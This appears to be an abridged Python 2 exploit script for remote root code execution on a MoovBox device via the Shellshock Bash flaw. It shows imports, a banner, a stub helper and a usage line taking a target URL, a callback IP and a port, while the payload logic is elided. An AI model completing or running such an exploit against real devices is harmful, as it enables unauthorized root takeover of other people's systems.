#!/usr/bin/python2
# coding: utf-8
# moovbox remote root via shellshock
# ~case
import requests
import struct
import socket
...
def banner():
   ...
   ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝ ╚████╔╝ ██████╔╝╚██████╔╝██╔╝ ██╗
   ╚═╝     ╚═╝ ╚═════╝  ╚═════╝   ╚═══╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ 
Bash/thttpd MoovBox ShellShock Remote (root) Code Execution Exploit
    \x1b[0m"""


# following shit ganked from bl4sty
def u32h(v):
...
if __name__ == "__main__":
    banner()
    if len(sys.argv) != 4:
        sys.exit("Usage: %s https://10.0.0.1 10.0.0.13 1337" %(sys.argv[0]))
